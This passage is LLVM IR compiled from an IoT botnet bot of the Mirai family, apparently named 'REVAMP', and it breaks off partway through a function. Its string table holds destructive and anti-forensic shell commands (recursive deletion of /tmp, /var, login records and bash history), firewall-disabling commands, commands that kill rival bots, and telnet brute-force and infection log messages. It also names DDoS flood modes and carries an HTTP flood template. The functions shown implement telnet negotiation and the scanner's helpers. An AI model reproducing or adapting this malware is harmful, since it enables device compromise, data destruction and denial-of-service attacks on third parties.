@getRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.473 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@MiraiIPRanges.ipState = internal global [4 x i8] zeroinitializer, align 1
@ourIP = dso_local global %struct.in_addr zeroinitializer, align 4
@.str.474 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.475 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.476 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.477 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.478 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.479 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.480 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.481 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.482 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.483 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.484 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.485 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.486 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.487 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.488 = private unnamed_addr constant [72 x i8] c"[ REVAMP ] Result || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.489 = private unnamed_addr constant [11 x i8] c"rm -rf %s;\00", align 1
@.str.490 = private unnamed_addr constant [91 x i8] c"[ REVAMP ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.491 = private unnamed_addr constant [27 x i8] c"pkill -9 %s;killall -9 %s;\00", align 1
@.str.492 = private unnamed_addr constant [78 x i8] c"[ REVAMP ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.493 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.494 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.495 = private unnamed_addr constant [75 x i8] c"[ REVAMP ] Infecting || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.496 = private unnamed_addr constant [7 x i8] c"LINKED\00", align 1
@.str.497 = private unnamed_addr constant [85 x i8] c"[ REVAMP ] Infection Success. || IP: %s: || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.498 = private unnamed_addr constant [72 x i8] c"[ REVAMP ] Failed || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.499 = private unnamed_addr constant [10 x i8] c"connected\00", align 1
@.str.500 = private unnamed_addr constant [11 x i8] c"d0mQacDMH0\00", align 1
@.str.501 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.502 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.503 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.504 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.505 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.506 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.507 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.508 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.509 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.510 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.511 = private unnamed_addr constant [5 x i8] c"SREP\00", align 1
@.str.512 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@scanPid = dso_local global i32 0, align 4
@.str.513 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.514 = private unnamed_addr constant [6 x i8] c"FLOAD\00", align 1
@.str.515 = private unnamed_addr constant [21 x i8] c"[SREP] FLoad Mode ON\00", align 1
@.str.516 = private unnamed_addr constant [6 x i8] c"MIRAI\00", align 1
@.str.517 = private unnamed_addr constant [21 x i8] c"FLoad Mode Activated\00", align 1
@.str.518 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.519 = private unnamed_addr constant [5 x i8] c"ZUDP\00", align 1
@.str.520 = private unnamed_addr constant [5 x i8] c"ZTCP\00", align 1
@.str.521 = private unnamed_addr constant [5 x i8] c"ZSTD\00", align 1
@.str.522 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.523 = private unnamed_addr constant [8 x i8] c"EXITFAG\00", align 1
@.str.524 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.525 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.526 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.527 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.528 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.529 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.530 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.531 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.532 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.533 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.534 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.535 = private unnamed_addr constant [35 x i8] c"[ INFECTED ] Arch: %s || Type: %s]\00", align 1
@.str.536 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.537 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.538 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0)
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @init_rand(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

10:                                               ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

13:                                               ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

31:                                               ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10, !llvm.loop !6

34:                                               ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

29:                                               ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

34:                                               ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @contains_string(i8* noundef %0, i8** noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

8:                                                ; preds = %16, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %16, label %17

16:                                               ; preds = %8
  br label %8, !llvm.loop !8

17:                                               ; preds = %8
  store i32 0, i32* %7, align 4
  br label %18

18:                                               ; preds = %33, %17
  %19 = load i32, i32* %7, align 4
  %20 = load i32, i32* %6, align 4
  %21 = icmp slt i32 %19, %20
  br i1 %21, label %22, label %36

22:                                               ; preds = %18
  %23 = load i8*, i8** %4, align 8
  %24 = load i8**, i8*** %5, align 8
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8*, i8** %24, i64 %26
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* noundef %23, i8* noundef %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

31:                                               ; preds = %22
  store i32 1, i32* %3, align 4
  br label %37

32:                                               ; preds = %22
  br label %33

33:                                               ; preds = %32
  %34 = load i32, i32* %7, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %7, align 4
  br label %18, !llvm.loop !9

36:                                               ; preds = %18
  store i32 0, i32* %3, align 4
  br label %37

37:                                               ; preds = %36, %31
  %38 = load i32, i32* %3, align 4
  ret i32 %38
}

declare i32 @strcasestr(...) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @contains_success(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* noundef %3, i8** noundef getelementptr inbounds ([18 x i8*], [18 x i8*]* @successes, i64 0, i64 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @contains_fail(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* noundef %3, i8** noundef getelementptr inbounds ([11 x i8*], [11 x i8*]* @fails, i64 0, i64 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @contains_response(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* noundef %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

6:                                                ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* noundef %7)
  %9 = icmp ne i32 %8, 0
  br label %10

10:                                               ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @read_with_timeout(i32 noundef %0, i32 noundef %1, i8* noundef %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca %struct.fd_set*, align 8
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

18:                                               ; preds = %4
  store %struct.fd_set* %10, %struct.fd_set** %13, align 8
  store i32 0, i32* %12, align 4
  br label %19

19:                                               ; preds = %29, %18
  %20 = load i32, i32* %12, align 4
  %21 = zext i32 %20 to i64
  %22 = icmp ult i64 %21, 16
  br i1 %22, label %23, label %32

23:                                               ; preds = %19
  %24 = load %struct.fd_set*, %struct.fd_set** %13, align 8
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %24, i32 0, i32 0
  %26 = load i32, i32* %12, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 %27
  store i64 0, i64* %28, align 8
  br label %29

29:                                               ; preds = %23
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %12, align 4
  br label %19, !llvm.loop !10

32:                                               ; preds = %19
  br label %33

33:                                               ; preds = %32
  %34 = load i32, i32* %6, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %39 = load i32, i32* %6, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %6, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 noundef %46, %struct.fd_set* noundef %10, %struct.fd_set* noundef null, %struct.fd_set* noundef null, %struct.timeval* noundef %11)
  %48 = icmp slt i32 %47, 1
  br i1 %48, label %49, label %50

49:                                               ; preds = %33
  store i32 0, i32* %5, align 4
  br label %57

50:                                               ; preds = %33
  %51 = load i32, i32* %6, align 4
  %52 = load i8*, i8** %8, align 8
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = call i64 @recv(i32 noundef %51, i8* noundef %52, i64 noundef %54, i32 noundef 0)
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* %5, align 4
  br label %57

57:                                               ; preds = %50, %49
  %58 = load i32, i32* %5, align 4
  ret i32 %58
}

declare i32 @select(i32 noundef, %struct.fd_set* noundef, %struct.fd_set* noundef, %struct.fd_set* noundef, %struct.timeval* noundef) #1

declare i64 @recv(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @read_until_response(i32 noundef %0, i32 noundef %1, i8* noundef %2, i32 noundef %3, i8** noundef %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %14, i8 0, i64 %16, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 noundef %17, i32 noundef %18, i8* noundef %19, i32 noundef %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

27:                                               ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 noundef %28, i8* noundef %29, i32 noundef 3)
  br label %31

31:                                               ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* noundef %32, i8** noundef %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

37:                                               ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

38:                                               ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @negotiate(i32 noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %63 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

13:                                               ; preds = %3
  store i32 0, i32* %4, align 4
  br label %65

14:                                               ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 noundef %15, i8* noundef %8, i64 noundef 1, i32 noundef 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

22:                                               ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %56

23:                                               ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

29:                                               ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %55

30:                                               ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %45

36:                                               ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = zext i1 %41 to i64
  %43 = select i1 %41, i32 251, i32 253
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %8, align 1
  br label %54

45:                                               ; preds = %30
  %46 = load i8*, i8** %6, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 1
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 253
  %51 = zext i1 %50 to i64
  %52 = select i1 %50, i32 252, i32 254
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %8, align 1
  br label %54

54:                                               ; preds = %45, %36
  br label %55

55:                                               ; preds = %54, %29
  br label %56

56:                                               ; preds = %55, %22
  %57 = load i32, i32* %5, align 4
  %58 = call i64 @send(i32 noundef %57, i8* noundef %8, i64 noundef 1, i32 noundef 16384)
  %59 = load i32, i32* %5, align 4
  %60 = load i8*, i8** %6, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 2
  %62 = call i64 @send(i32 noundef %59, i8* noundef %61, i64 noundef 1, i32 noundef 16384)
  br label %64

63:                                               ; preds = %3
  br label %64

64:                                               ; preds = %63, %56
  store i32 0, i32* %4, align 4
  br label %65

65:                                               ; preds = %64, %13
  %66 = load i32, i32* %4, align 4
  ret i32 %66
}

declare i64 @send(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @get_telstate_host(%struct.telstate_t* noundef %0) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #10
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @advance_telstate(%struct.telstate_t* noundef %0, i32 noundef %1) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

7:                                                ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 noundef %10)
  br label %12

12:                                               ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %21, i8 0, i64 1024, i1 false)
  ret void
}

declare i32 @close(i32 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @reset_telstate(%struct.telstate_t* noundef %0) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* noundef %3, i32 noundef 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @trim(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* noundef %6) #11
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 noundef %16) #11
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !11

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 noundef %33) #11
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !12

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !13

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8* noundef) #4

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32 noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @zprintf(i8* noundef %0, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
